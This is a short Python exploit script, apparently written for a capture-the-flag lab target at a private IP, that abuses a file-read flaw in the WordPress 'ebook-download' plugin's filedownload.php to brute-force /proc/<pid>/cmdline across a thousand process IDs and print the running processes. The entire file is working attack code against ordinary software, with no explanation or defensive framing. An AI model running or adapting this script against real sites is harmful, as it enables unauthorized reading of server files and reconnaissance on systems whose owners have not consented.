#!/usr/bin/python

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

def fetch_process(session, ip, i):
    url = (
        f"http://{ip}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="
        f"/proc/{i}/cmdline"
    )
    response = session.get(url)
    process = response.text.lstrip(f"/proc/{i}/cmdline").strip("<script>window.close()</script>")
    if len(process) > 1:
        return i, process
    return None

def pid_brute(ip):
    print("Searching for processes, please don't quit the program")
    session = requests.Session()

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(fetch_process, session, ip, i) for i in range(1000)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                i, process = result
                print(f"Process {i}: {process}")

def main():
    ip = "10.10.11.125"
    pid_brute(ip)

if __name__ == "__main__":
    main()
